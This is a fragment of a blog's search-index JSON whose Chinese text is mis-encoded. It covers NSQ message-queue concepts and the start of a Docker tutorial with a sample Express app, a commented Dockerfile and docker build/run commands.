","date":"2018-07-08","objectID":"/nsq/:4:3","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"Backoff æœ‰æ—¶å€™ consumer å¤„ç†æ¶ˆæ¯é¢ä¸´å¾ˆå¤§çš„å‹åŠ›ï¼Œéšæ—¶æœ‰å´©æºƒçš„é£é™©ï¼Œè¿™ç§æƒ…å†µä¸‹å¯ä»¥ä¸»åŠ¨å‘ nsq å‘é€ RDY 0 å®ç° backoff ï¼Œæ¢å¥è¯è¯´å°±æ˜¯æ¶ˆè´¹ç«¯æš‚åœæ¥å—ç­‰å¤šæ¶ˆæ¯ï¼Œä»¥å‡è½»è‡ªèº«å‹åŠ›é¿å…å´©æºƒï¼Œç­‰åˆ°æœ‰æ›´å¤šå¤„ç†èƒ½åŠ›æ—¶å†å–æ¶ˆæš‚åœçŠ¶æ€æ…¢æ…¢æ¥æ”¶æ›´å¤šæ¶ˆæ¯ã€‚å½“ç„¶è¿›å…¥ backoff ç„¶åæ…¢æ…¢æ¢å¤æ˜¯ä¸€ä¸ªéœ€è¦åŠ¨æ€è°ƒèŠ‚çš„è¿‡ç¨‹ã€‚ äº‹å®ä¸ŠåŠ å¿«æ¶ˆæ¯çš„å¤„ç†æ‰æ˜¯æˆ‘ä»¬éœ€è¦å…³æ³¨çš„é‡ä¸­ä¹‹é‡ã€‚ ","date":"2018-07-08","objectID":"/nsq/:4:4","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"å…¶å®ƒ ","date":"2018-07-08","objectID":"/nsq/:5:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"nsqlookupd nsqlookupd æä¾›æœåŠ¡å‘ç°çš„åŠŸèƒ½ï¼Œç”¨æ¥å¯»å€ç‰¹å®šä¸»é¢˜çš„ nsqdã€‚å¦‚æœå®¢æˆ·ç«¯ç›´æ¥ nsqd ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æŸäº› topic çš„ nsqd åœ¨æŸä¸ªåœ°å€ï¼Œå¦ä¸€äº› topic çš„ nsqd åœ¨å¦å¤–çš„åœ°å€ï¼Œè¯•æƒ³å½“æˆ‘ä»¬çš„ nsqd é›†ç¾¤æ•°é‡å˜å¾—è¶Šæ¥åºå¤§ï¼Œtopic çš„ç§ç±»ä¹Ÿè¶Šæ¥è¶Šå¤šæ—¶ï¼Œè¿™ç§ç›´è¿çš„æ–¹æ³•æ˜¯æœ‰å¤šä¹ˆçš„æ··ä¹±ï¼Œè€Œ nsqlookupd å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æ‰€æœ‰çš„ nsqd éƒ½æ³¨å†Œåˆ° nsqlookupd ä¸Šï¼Œç„¶åå®¢æˆ·ç«¯åªéœ€è¦è¿æ¥ nsqlookupd å°±å¯ä»¥è½»æ¾å¯»å€åˆ°æ‰€æœ‰ä¸»é¢˜ã€‚ä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ nsqlookupd åªè´Ÿè´£å¯»å€ï¼Œä¸å¯¹æ¶ˆæ¯åšä»»ä½•å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºå®¢æˆ·ç«¯å‘ nsqlookupd å¯»å€å®Œæˆåï¼Œä»ç„¶æ˜¯ä¸ nsqd ç›´è¿å†è¿›è¡Œæ¶ˆæ¯å¤„ç†ã€‚ ä¸ºäº†é¿å… nsqlookupd çš„å•ç‚¹æ•…éšœï¼Œéƒ¨ç½²å¤šä¸ªå³å¯ã€‚é€šå¸¸ä¸€ä¸ªæ•°æ®ä¸­å¿ƒéƒ¨ç½²ä¸‰ä¸ª nsqlookupd å°±å¯ä»¥åº”å¯¹æˆç™¾ä¸Šåƒçš„ nsqd é›†ç¾¤ã€‚ ","date":"2018-07-08","objectID":"/nsq/:5:1","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"-mem-queue-size é…ç½®é¡¹ -mem-queue-sizeï¼šé˜Ÿåˆ—åœ¨å†…å­˜ä¸­ä¿ç•™çš„æ¶ˆæ¯æ•°é‡ï¼Œé»˜è®¤ 10000 ã€‚ä¸€æ—¦æ¶ˆæ¯æ•°é‡è¶…è¿‡äº†è¿™ä¸ªé˜ˆå€¼ï¼Œé‚£ä¹ˆè¶…å‡ºçš„æ¶ˆæ¯å°†è¢«å†™å…¥åˆ°ç£ç›˜ä¸­ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥è®¾ç½®ä¸º 0 ï¼Œè¿™æ ·æ‰€æœ‰çš„æ¶ˆæ¯éƒ½å°†è¢«å†™å…¥åˆ°ç£ç›˜ä¸­ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å³ä½¿ä½ è¿™æ ·åšäº†ä¹Ÿæ— æ³•ä¿è¯æ¶ˆæ¯ç™¾åˆ†ç™¾ä¸ä¸¢å¤±ï¼Œå› ä¸º in-flight çŠ¶æ€å’Œ defer å»¶æ—¶çŠ¶æ€ä¸‹çš„æ¶ˆæ¯ä»ç„¶æ˜¯åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥æç«¯æƒ…å†µä¸‹ä»æ—§ä¼šä¸¢å¤±ã€‚å¦å¤–å¯¹äº clean shutdown å¹²å‡€é€€å‡ºçš„æƒ…å†µ nsq æ˜¯ä¿è¯äº†æ¶ˆæ¯ä¸ä¸¢å¤±çš„ï¼Œå³ä½¿åœ¨å†…å­˜ä¸­ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬åº”è¯¥æ”¾å¿ƒå¤§èƒ†çš„ä½¿ç”¨æ›´å¯èƒ½å¤šçš„å†…å­˜ã€‚ ","date":"2018-07-08","objectID":"/nsq/:5:2","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"SPOF NSQ æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„è®¾è®¡ï¼Œå¯ä»¥æœ‰æ•ˆçš„é¿å… SPOF å•ç‚¹æ•…éšœã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾çš„éƒ¨ç½²è¶³å¤Ÿå¤šçš„ nsqd åˆ°å¤šå°æœºå™¨ä¸Šï¼Œå¹¶è®©æ¶ˆè´¹è€…ä¸ä¹‹è¿æ¥ï¼ˆè¿™ä¸ªå›¾ç®€åŒ–å¤„ç†äº†ï¼Œæˆ‘ä»¬ä»åº”è¯¥ä½¿ç”¨ nsqlookupd ï¼‰ã€‚æ¯ä¸€ä¸ª nsqd ä¹‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰ä»»ä½•å…³è”ã€‚è¿™å°±æ˜¯è¯´å¦‚æœä¸‰ä¸ª nsqd å…·æœ‰ç›¸åŒçš„ topic å’Œ channel ï¼Œæˆ‘ä»¬å‘å®ƒä»¬å‘é€åŒä¸€æ¡æ¶ˆæ¯ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯åˆ†åˆ«å‘é€äº†ä¸‰æ¡æ¶ˆæ¯ï¼Œç»“æœå°±æ˜¯è¿æ¥è¿™ä¸‰ä¸ª nsqd çš„ consumer å°†ä¼šæ”¶åˆ°ä¸‰æ¡æ¶ˆæ¯ã€‚è¿™æ ·åšæ˜¾ç„¶æœ‰æ•ˆçš„æé«˜äº†å¯é æ€§ï¼Œä½†æ˜¯åœ¨æ¶ˆè´¹ç«¯ä¸€å®šè¦åšå¥½é‡å¤æ¶ˆæ¯çš„å¤„ç†é—®é¢˜ã€‚ ","date":"2018-07-08","objectID":"/nsq/:5:3","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"å…¶å®ƒ æ¶ˆæ¯æ˜¯æ— åºçš„ æ¶ˆæ¯å¯èƒ½ä¼šè¢«ä¼ é€’å¤šæ¬¡ æ²¡æœ‰å¤æ‚çš„è·¯ç”± æ²¡æœ‰è‡ªåŠ¨åŒ–çš„ replication å‰¯æœ¬ ","date":"2018-07-08","objectID":"/nsq/:5:4","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Middleware"],"content":"ç»“è¯­ æ¶ˆæ¯é˜Ÿåˆ—å¹¶ä¸æ˜¯å¤§åŒ…å¤§æ½å¹²æ‰æ‰€æœ‰äº‹æƒ…ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä¸ mysql å’Œ redis ç­‰ç­‰ä¸€èµ·ä½¿ç”¨ã€‚ NSQ ä¸å¾—ä¸è¯´æ˜¯å¤ªç²¾è‡´äº†ï¼Œæ°´å¹³æ‰©å±•ç›¸å½“æ–¹ä¾¿ï¼Œæ¶ˆæ¯ä¼ é€’ä¹Ÿéå¸¸é«˜æ•ˆï¼Œå¼ºçƒˆæ¨èã€‚ ","date":"2018-07-08","objectID":"/nsq/:6:0","tags":["MQ","NSQ"],"title":"æ¶ˆæ¯é˜Ÿåˆ— NSQ å…¥é—¨æŒ‡å—","uri":"/nsq/"},{"categories":["Kubernetes"],"content":"Docker å…¥é—¨æ•™ç¨‹","date":"2018-04-17","objectID":"/docker-guide/","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"ä¸€ ç¨‹åºæ˜æ˜åœ¨æˆ‘æœ¬åœ°è·‘å¾—å¥½å¥½çš„ï¼Œæ€ä¹ˆéƒ¨ç½²ä¸Šå»å°±å‡ºé—®é¢˜äº†ï¼Ÿå¦‚æœè¦åœ¨åŒä¸€å°ç‰©ç†æœºä¸ŠåŒæ—¶éƒ¨ç½²å¤šä¸ª node ç‰ˆæœ¬å¹¶ç‹¬ç«‹è¿è¡Œäº’ä¸å½±å“ï¼Œè¿™åˆè¯¥æ€ä¹ˆåšï¼Ÿå¦‚ä½•æ›´å¿«é€Ÿçš„å°†æœåŠ¡éƒ¨ç½²åˆ°å¤šä¸ªç‰©ç†æœºä¸Šï¼Ÿ â€œBuild once , run anywhereâ€ ï¼Œæ—¢å¯ä»¥ä¿è¯ç¯å¢ƒçš„ä¸€è‡´æ€§ï¼ŒåŒæ—¶åˆèƒ½æ›´æ–¹ä¾¿çš„å°†å„ä¸ªç¯å¢ƒç›¸äº’éš”ç¦»ï¼Œè¿˜èƒ½æ›´å¿«é€Ÿçš„éƒ¨ç½²å„ç§æœåŠ¡ï¼Œè¿™å°±æ˜¯ docker çš„èƒ½åŠ›ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:0:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"åŸºæœ¬æ¦‚å¿µ ä¸€å¼ å›¾æ…¢æ…¢è®²ï¼š 1ã€æœ¬åœ°å¼€å‘å†™å¥½äº† code ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦é€šè¿‡ build å‘½ä»¤æ„å»º image é•œåƒï¼Œè€Œæ„å»ºçš„è§„åˆ™å‘¢ï¼Œå°±éœ€è¦å†™åœ¨è¿™ä¸ª dockerfile æ–‡ä»¶é‡Œã€‚ 2ã€image é•œåƒæ˜¯ä»€ä¹ˆï¼Ÿé™æ€çš„ã€åªè¯»çš„æ–‡ä»¶ï¼ˆå…ˆä¸ç€æ€¥ï¼Œæœ‰ä¸ªåŸºæœ¬å°è±¡ï¼Œåé¢å†æ…¢æ…¢è®²ï¼‰ã€‚å¦‚ä½•æ›´æ–¹ä¾¿çš„åŒºåˆ†ä¸åŒçš„é•œåƒå‘¢ï¼Œé€šè¿‡ tag å‘½ä»¤ç»™é•œåƒæ‰“ä¸Šæ ‡ç­¾å°±è¡Œäº†ã€‚ 3ã€image é•œåƒå­˜åœ¨å“ªé‡Œï¼Ÿé€šè¿‡ push å‘½ä»¤æ¨é€åˆ° repository é•œåƒä»“åº“ï¼Œæ¯ä¸ªä»“åº“å¯ä»¥å­˜æ”¾å¤šä¸ªé•œåƒã€‚ 4ã€registry æ˜¯å•¥ï¼Ÿä»“åº“æœåŠ¡å™¨ï¼Œæ‰€æœ‰ repository ä»“åº“éƒ½å¿…é¡»ä¾èµ–äºä¸€ä¸ª registry æ‰èƒ½æä¾›é•œåƒå­˜å‚¨çš„æœåŠ¡ã€‚æˆ‘ä»¬åœ¨è‡ªå·±çš„ç‰©ç†æœºä¸Šå®‰è£…ä¸€ä¸ª registry ï¼Œè¿™æ ·å¯ä»¥æ„å»ºè‡ªå·±ç§æœ‰çš„é•œåƒä»“åº“äº†ã€‚ 5ã€é•œåƒå…‰å­˜åˆ°ä»“åº“é‡Œå¯æ²¡ç”¨ï¼Œè¿˜è¦èƒ½éƒ¨ç½²å¹¶è¿è¡Œèµ·æ¥ã€‚ 6ã€é¦–å…ˆé€šè¿‡ pull å‘½ä»¤å°†ä»“åº“é‡Œçš„é•œåƒæ‹‰åˆ°æœåŠ¡å™¨ä¸Šï¼Œç„¶åé€šè¿‡ run å‘½ä»¤å³å¯å°†è¿™ä¸ªé•œåƒæ„å»ºæˆä¸€ä¸ª container å®¹å™¨ï¼Œå®¹å™¨åˆæ˜¯ä»€ä¹ˆï¼Ÿæ˜¯é•œåƒçš„è¿è¡Œæ—¶ï¼Œè¯»å–é•œåƒé‡Œçš„å„ç§é…ç½®æ–‡ä»¶å¹¶å¦‚åŒä¸€ä¸ªå°è€Œç‹¬ç«‹çš„æœåŠ¡å™¨ä¸€æ ·è¿è¡Œä½ çš„å„ç§æœåŠ¡ã€‚åˆ°è¿™é‡Œï¼Œä½ çš„ä¸€ä¸ªæœåŠ¡å°±ç®—æ˜¯éƒ¨ç½²å¹¶è¿è¡Œèµ·æ¥äº†ã€‚ 7ã€æ•°æ®æ€ä¹ˆåŠï¼Ÿé€šè¿‡ volume æ•°æ®å·å¯ä»¥å°†å®¹å™¨ä½¿ç”¨çš„æ•°æ®æŒ‚åœ¨åˆ°ç‰©ç†æœºæœ¬åœ°ï¼Œè€Œå„ä¸ªå®¹å™¨ä¹‹é—´ç›¸äº’ä¼ é€’å¤„ç†æ•°æ®å‘¢ï¼Œç»Ÿä¸€é€šè¿‡å¦ä¸€ä¸ª volume container æ•°æ®å·å®¹å™¨æä¾›æ•°æ®çš„æœåŠ¡ï¼Œæ•°æ®å·å®¹å™¨ä¹Ÿåªæ˜¯ä¸€ä¸ªæ™®é€šçš„å®¹å™¨ã€‚ 8ã€image é•œåƒæ€ä¹ˆå¯¼å…¥å¯¼å‡ºåˆ°æœ¬åœ°ï¼Ÿé€šè¿‡ save å‘½ä»¤å³å¯å¯¼å‡ºæˆå‹ç¼©åŒ…åˆ°ç‰©ç†æœºæœ¬åœ°ç£ç›˜ä¸Šï¼Œé€šè¿‡ load å‘½ä»¤å°±å¯ä»¥å¯¼å…¥æˆ docker ç¯å¢ƒä¸‹çš„é•œåƒã€‚ 9ã€container å®¹å™¨çš„å¯¼å…¥å¯¼å‡ºå‘¢ï¼Ÿé€šè¿‡ export å‘½ä»¤åŒæ ·å¯ä»¥å¯¼å‡ºåˆ°ç‰©ç†æœºæœ¬åœ°ç£ç›˜ï¼Œä½†æ˜¯ä¸é•œåƒå¯¼å‡ºä¸åŒçš„æ˜¯ï¼Œè¿™æ ·å¯¼å‡ºçš„åªæ˜¯ä¸€ä¸ªå®¹å™¨çš„å¿«ç…§æ–‡ä»¶ï¼Œè¿™å°±æ˜¯è¯´å®ƒä¼šä¸¢å¼ƒæ‰€æœ‰çš„å†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯ï¼Œåªè®°å½•äº†å½“å‰å®¹å™¨çš„çŠ¶æ€ã€‚å¯¼å…¥åˆ™æ˜¯ import å‘½ä»¤ï¼Œä½†æ˜¯åªèƒ½å¯¼å…¥ä¸ºå¦ä¸€ä¸ª image é•œåƒï¼Œè€Œä¸èƒ½ç›´æ¥å°±å¯¼å…¥æˆå®¹å™¨ï¼Œå®¹å™¨åªæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ã€‚ äºŒ ","date":"2018-04-17","objectID":"/docker-guide/:1:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"é•œåƒ Docker ä¸­çš„é•œåƒåˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯ä¸€ä¸ªå¯ä¾›æ‰§è¡Œçš„æ–‡ä»¶ç³»ç»ŸåŒ…ï¼Œé‡Œé¢åŒ…å«äº†è¿è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„ä»£ç ã€åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ç­‰ç­‰æ‰€æœ‰å†…å®¹ã€‚ é•œåƒæ˜¯åˆ†å±‚çš„ã€‚å®ƒæ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿå åŠ è€Œæˆï¼Œæœ€åº•å±‚æ˜¯ bootfs å³å¼•å¯¼æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ‘ä»¬å‡ ä¹æ°¸è¿œä¸ä¼šä¸è¿™ä¸ªä¸œè¥¿æœ‰ä»€ä¹ˆäº¤äº’ï¼Œè€Œä¸”å½“å®¹å™¨å¯åŠ¨æ—¶ bootfs ä¼šè¢«å¸è½½æ‰ã€‚ç¬¬äºŒå±‚æ˜¯ rootfs ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œå…¶åŒ…å«äº†ç¨‹åºè¿è¡Œæ‰€éœ€çš„æœ€åŸºæœ¬ç¯å¢ƒï¼Œä¹Ÿç§°ä¹‹ä¸ºåŸºç¡€é•œåƒã€‚ç¬¬ä¸‰ã€ç¬¬å››ã€ç¬¬Nå±‚ï¼Œæ˜¯ç”±æˆ‘ä»¬è‡ªå·±æŒ‡å®šçš„å…¶å®ƒèµ„æºæ–‡ä»¶ã€‚ é•œåƒå±‚å±‚å åŠ ï¼Œå‘ä¸‹å¼•ç”¨ä¾èµ–ï¼Œè€Œ docker ä½¿ç”¨äº†è”åˆåŠ è½½æŠ€æœ¯åŒæ—¶åŠ è½½å¤šå±‚æ–‡ä»¶ç³»ç»Ÿï¼Œä½¿æˆ‘ä»¬å¯ä»¥ä¸€èµ·çœ‹åˆ°æ‰€æœ‰çš„æ–‡ä»¶åŠå…¶èµ„æºï¼Œä»¿ä½›å…¶å¹¶æ²¡æœ‰è¢«åˆ†å±‚ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸€æ ·ã€‚ é•œåƒæ˜¯åªè¯»çš„ï¼Œä¹Ÿå°±æ„å‘³ç€å…¶æ— æ³•è¢«æ›´æ”¹ï¼Œè¿™æ­£æ˜¯ä¿è¯ç¯å¢ƒä¸€è‡´æ€§çš„å…³é”®åŸå› ã€‚ å®¹å™¨åˆ™æ˜¯é•œåƒçš„è¿è¡Œæ—¶ï¼Œä¼šåœ¨é•œåƒæœ€å¤–å±‚åŠ è½½ä¸€å±‚è¯»å†™å±‚ï¼Œè¿™æ ·ä¾¿èƒ½è¿›è¡Œæ–‡ä»¶çš„è¯»å†™ï¼Œä½†å…¶ä¸ä¼šå¯¹ä¸‹å±‚é•œåƒçš„å†…å®¹è¿›è¡Œä¿®æ”¹ï¼Œåº”ç”¨ç¨‹åºåªæœ‰é€šè¿‡å®¹å™¨æ‰èƒ½å¯åŠ¨å¹¶å¯¹å¤–æä¾›æœåŠ¡ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:2:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"æ„å»ºé•œåƒ é¦–å…ˆéœ€è¦å‡†å¤‡æˆ‘ä»¬çš„é¡¹ç›®ä»£ç ï¼š const express = require('express'); const app = express(); const PORT = 8888; app.get('/', async (req, res) =\u003e { res.end(` NODE_NEV : ${process.env.NODE_ENV} \\n Contanier port : ${PORT}`); }); app.listen(PORT); /* æ„å»ºé•œåƒï¼šdocker build --build-arg NODE_ENV=develop -t docker-demo . å¯åŠ¨å®¹å™¨ï¼šdocker run --name demo -it -p 9999:8888 docker-demo */ ç¼–å†™ Dockerfile æ–‡ä»¶ï¼š # æŒ‡å®šåŸºç¡€é•œåƒ FROM node:8.11.1 # MAINTAINER æ–°ç‰ˆæœ¬å·²ç»è¢«åºŸå¼ƒï¼Œç”¨æ¥å£°æ˜ä½œè€…ä¿¡æ¯ï¼Œä½¿ç”¨ LABEL ä»£æ›¿ # LABEL é€šè¿‡è‡ªå®šä¹‰é”®å€¼å¯¹çš„å½¢å¼å£°æ˜æ­¤é•œåƒçš„ç›¸å…³ä¿¡æ¯ï¼Œå£°æ˜åé€šè¿‡ docker inspect å¯ä»¥çœ‹åˆ° LABEL maintainer=\"rife\" LABEL version=\"1.0.0\" LABEL description=\"This is a test image.\" # WORKDIR æŒ‡å®šå·¥ä½œç›®å½•ï¼Œè‹¥ä¸å­˜åœ¨åˆ™è‡ªåŠ¨åˆ›å»ºï¼Œå…¶ä»–æŒ‡ä»¤å‡ä¼šä»¥æ­¤ä½œä¸ºè·¯å¾„ã€‚ WORKDIR /work/myapp/ # ADD \u003csrc\u003e \u003cdest\u003e # å°†æºæ–‡ä»¶èµ„æºæ·»åŠ åˆ°é•œåƒçš„æŒ‡å®šç›®å½•ä¸­ï¼Œè‹¥æ˜¯å‹ç¼©æ–‡ä»¶ä¼šè‡ªåŠ¨åœ¨é•œåƒä¸­è§£å‹ï¼Œå¯ä»¥é€šè¿‡ url æŒ‡å®šè¿œç¨‹çš„æ–‡ä»¶ ADD 'https://github.com/nodejscn/node-api-cn/blob/master/README.md' ./test/ # COPY \u003csrc\u003e \u003cdest\u003e # åŒæ ·æ˜¯å¤åˆ¶æ–‡ä»¶èµ„æºï¼Œä½†æ— æ³•è§£å‹ï¼Œæ— æ³•é€šè¿‡ url æŒ‡å®šè¿œç¨‹æ–‡ä»¶ # ç¤ºä¾‹ï¼šå°†æœ¬åœ°çš„å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°é•œåƒä¸­ WORKDIR æŒ‡å®šçš„å½“å‰ç›®å½• COPY ./ ./ # RUN æ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤ RUN npm install # ARG æŒ‡å®šæ„å»ºé•œåƒæ—¶å¯ä¼ é€’çš„å‚æ•°ï¼Œä¸ ENV é…åˆä½¿ç”¨ # ç¤ºä¾‹ï¼šé€šè¿‡ docker build --build-arg NODE_ENV=develop å¯çµæ´»æŒ‡å®šç¯å¢ƒå˜é‡ ARG NODE_ENV # ENV è®¾ç½®å®¹å™¨è¿è¡Œçš„ç¯å¢ƒå˜é‡ ENV NODE_ENV=$NODE_ENV # EXPOSE æš´éœ²å®¹å™¨ç«¯å£ï¼Œéœ€è¦åœ¨å¯åŠ¨æ—¶æŒ‡å®šå…¶ä¸å®¿ä¸»æœºç«¯å£çš„æ˜ å°„ EXPOSE 8888 # CMD å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤ï¼Œåªæ‰§è¡Œæœ€åå£°æ˜çš„é‚£æ¡å‘½ä»¤ï¼Œä¼šè¢« docker run å‘½ä»¤è¦†ç›– CMD [\"npm\", \"start\"] # ENTRYPOINT å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤ï¼Œåªæ‰§è¡Œæœ€åå£°æ˜çš„é‚£æ¡å‘½ä»¤ï¼Œä¸ä¼šè¢«è¦†ç›–æ‰ # ä»»ä½• docker run è®¾ç½®çš„æŒ‡ä»¤å‚æ•°æˆ– CMD æŒ‡ä»¤ï¼Œéƒ½å°†ä½œä¸ºå‚æ•°è¿½åŠ åˆ° ENTRYPOINT æŒ‡ä»¤çš„å‘½ä»¤ä¹‹åã€‚ åœ¨ Dockerfile ä¸­ï¼Œæˆ‘ä»¬æŒ‡å®šäº†åŸºç¡€é•œåƒã€å£°æ˜äº†é•œåƒçš„åŸºç¡€ä¿¡æ¯ï¼ŒæŒ‡å®šäº†é•œåƒçš„å·¥ä½œç›®å½•ï¼ŒæŠŠé¡¹ç›®æ–‡ä»¶æ·»åŠ åˆ°äº†é•œåƒä¸­ï¼ŒæŒ‡å®šäº†ç¯å¢ƒå˜é‡ï¼Œæš´éœ²äº†å®¹å™¨ç«¯å£ï¼ŒæŒ‡å®šäº†å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤ã€‚ åœ¨å¤åˆ¶æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ .dockerignore æŒ‡å®šå¿½ç•¥å¤åˆ¶åˆ°é•œåƒä¸­çš„æ–‡ä»¶ï¼Œç”¨æ³•ä¸ .gitignore ç±»ä¼¼ã€‚ è¯»è€…å¯ä»¥ä»”ç»†é˜…è¯»ä¸Šå›¾ Dockerfile ä¸­çš„æ³¨é‡Šã€‚ è¾“å…¥æŒ‡ä»¤ï¼š docker build --build-arg NODE_ENV=develop -t docker-demo . é€šè¿‡ -t æŒ‡å®šäº†é•œåƒçš„æ ‡ç­¾ï¼Œâ€“build-arg æŒ‡å®šäº† Dockerfile ä¸­çš„ ARG å£°æ˜çš„å˜é‡ï¼Œä¹Ÿå°±æ˜¯ ENV ç¯å¢ƒå˜é‡ï¼Œè‡³æ­¤æˆ‘ä»¬å°±æˆåŠŸçš„æ„å»ºäº†è‡ªå·±çš„é•œåƒã€‚ç”±äºç½‘ç»œåŸå› æ‹‰å–é•œåƒå¯èƒ½ä¼šå¾ˆæ…¢ï¼Œè¯»è€…å¯ä»¥ä½¿ç”¨ DaoCloud æä¾›çš„åŠ é€Ÿåœ°å€ï¼ˆå…¶å®˜ç½‘çš„åŠ é€Ÿå™¨å°±æ˜¯ï¼‰ã€‚ è¾“å…¥å‘½ä»¤ï¼š docker run --name demo -it -p 9999:8888 docker-demo é€šè¿‡ â€“name æŒ‡å®šå®¹å™¨çš„åˆ«åï¼Œ-p æŒ‡å®šå®¿ä¸»æœºä¸å®¹å™¨ä¹‹é—´ç«¯å£çš„æ˜ å°„ï¼Œè‡³æ­¤æˆ‘ä»¬åŸºäºåˆšåˆšæ„å»ºçš„é•œåƒå¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ï¼Œè€Œå®¹å™¨å°±æ˜¯é•œåƒçš„è¿è¡Œæ—¶ï¼Œæœ€åæˆ‘ä»¬åœ¨è‡ªå·±çš„å®¿ä¸»æœºä¸Šè®¿é—® localhost:9999 å°±èƒ½è¿æ¥åˆ° docker å®¹å™¨å†…çš„ web ç¤ºä¾‹æœåŠ¡äº†ã€‚ é•œåƒæ˜¯åªè¯»çš„ã€åˆ†å±‚çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®¹å™¨æ˜¯é•œåƒçš„è¿è¡Œæ—¶ã€‚é‡ç‚¹å…³æ³¨é€šè¿‡ Dockerfile æ„å»ºé•œåƒã€‚ ä¸‰ ç°åœ¨æœ‰äº† dockerï¼Œå¦‚æœè¦é¢‘ç¹çš„æ›´æ”¹å’Œæµ‹è¯•ç¨‹åºæ—¶æ€ä¹ˆåŠï¼Œæ¯æ¬¡éƒ½é‡æ–°æ‰“ä¸€ä¸ªæ–°çš„é•œåƒç„¶åå¯åŠ¨å®¹å™¨ï¼Ÿ å®¹å™¨åªæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ï¼Œä¸€æ—¦è¢«æ€æ­»ï¼Œå…¶å†…éƒ¨çš„æ•°æ®éƒ½ä¼šè¢«æ¸…é™¤ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è¦æ•°æ®è¢«æŒä¹…åŒ–ï¼Œåˆè¯¥æ€ä¹ˆåŠï¼Ÿ ä¸åŒçš„å®¹å™¨ä¹‹é—´å¸¸å¸¸éœ€è¦å…±äº«æŸäº›æ•°æ®ï¼Œè¿™åˆè¯¥è§£å†³å‘¢ï¼Ÿ ","date":"2018-04-17","objectID":"/docker-guide/:3:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"volume Volume ç¿»è¯‘ä¸ºå·ï¼Œå› ä¸ºåŸºæœ¬ä¸Šç”¨äºæŒ‚è½½æ•°æ®ï¼Œæ‰€ä»¥ä¹Ÿå¸¸å¸¸ç›´æ¥ç§°ä¹‹ä¸ºæ•°æ®å·ã€‚ æ‰€è°“çš„æŒ‚è½½æ•°æ®å·ï¼Œå®é™…ä¸Šå°±æ˜¯æŠŠå®¿ä¸»æœºæœ¬åœ°çš„ç›®å½•æ–‡ä»¶æ˜ å°„åˆ° docker 